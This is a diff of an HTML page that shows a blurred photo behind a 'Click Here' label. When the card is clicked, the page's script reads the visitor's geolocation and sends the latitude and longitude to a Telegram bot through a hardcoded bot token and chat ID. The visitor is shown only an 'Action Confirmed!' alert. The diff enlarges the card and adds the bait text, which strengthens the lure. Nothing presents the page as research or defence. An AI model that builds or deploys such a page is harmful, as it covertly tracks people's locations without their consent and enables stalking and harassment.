@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Action Card</title>
+  <title>Action Confirm</title>
   <style>
     body {
       margin: 0;
@@ -14,59 +14,50 @@
       background-color: #f0f0f0;
     }
     #card {
-      width: 300px;
-      height: 200px;
+      width: 90vw;
+      height: 70vh;
       background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg');
       background-size: cover;
       background-position: center;
-      filter: blur(3px); /* الصورة مموهة */
-      border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      filter: blur(3px); /* تغبيش الصورة */
       cursor: pointer;
       display: flex;
       justify-content: center;
       align-items: center;
       color: white;
       font-weight: bold;
-      text-shadow: 1px 1px 2px black;
-      font-size: 18px;
-      user-select: none;
-    }
-    #card:hover {
-      filter: blur(1px); /* كشف بسيط عند التمرير */
+      font-size: 22px;
+      text-shadow: 1px 1px 3px black;
     }
   </style>
 </head>
 <body>
-  <div id="card"></div>
+  <div id="card">Click Here</div>
 
   <script>
     const card = document.getElementById('card');
-    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
-    const CHAT_ID = "7485197107"; // معرف الشات
+    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
+    const CHAT_ID = "7485197107";
 
     card.addEventListener('click', () => {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          position => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: `Lat: ${lat}\nLon: ${lon}`
-              })
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: `Lat: ${lat}\nLon: ${lon}`
             })
-            .then(res => console.log('Sent to bot', res))
-            .catch(err => console.error(err));
+          });
 
-            alert('Action Confirmed!');
-          },
-          error => alert('Unable to get location: ' + error.message)
-        );
+          alert('Action Confirmed!');
+        }, error => {
+          alert('Unable to get location.');
+        });
       } else {
         alert('Geolocation not supported.');
       }
